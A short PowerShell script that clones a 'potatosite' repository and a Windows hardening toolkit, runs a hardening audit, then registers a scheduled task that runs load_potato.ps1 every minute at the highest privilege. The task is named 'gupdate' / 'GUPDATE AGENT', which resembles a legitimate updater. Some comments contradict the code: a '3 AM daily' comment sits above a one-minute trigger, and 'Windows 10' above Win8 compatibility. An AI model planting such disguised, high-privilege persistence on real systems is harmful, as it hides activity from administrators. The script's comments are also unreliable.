<#
.Synopsis
    Clone repos / Init Hardenning
.Description
	IT WORKS!
#>


Set-Location -Path "C:\Program Files\MTI\" -PassThru

git clone https://github.com/ELSadGeek/potatosite.git
git clone https://github.com/0x6d69636b/windows_hardening.git


Set-Location -Path "C:\Program Files\MTI\windows_hardening" -PassThru

Import-Module .\HardeningKitty.psm1
Invoke-HardeningKitty -EmojiSupport


#Task Schedule

$taskName = "gupdate"
# Unregister-ScheduledTask -TaskName $taskname -Confirm:$false
# Describe the scheduled task.
$description = "GUPDATE AGENT"


# Create a new task action

$taskAction = New-ScheduledTaskAction `
    -Execute 'powershell.exe' `
    -Argument '-File "C:\Program Files\MTI\load_potato.ps1"'


# Create a new trigger (Daily at 3 AM)

$taskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)

# Register the scheduled task

Register-ScheduledTask `
    -TaskName $taskName `
    -Action $taskAction `
    -Trigger $taskTrigger `
    -Description $description

$UserId = "TI"
# Set the task principal's user ID and run level.
$taskPrincipal = New-ScheduledTaskPrincipal -UserId $UserId -RunLevel Highest 
# Set the task compatibility value to Windows 10.
$taskSettings = New-ScheduledTaskSettingsSet -Compatibility Win8
# Update the task principal settings
Set-ScheduledTask -TaskName $taskName -Principal $taskPrincipal -Settings $taskSettings

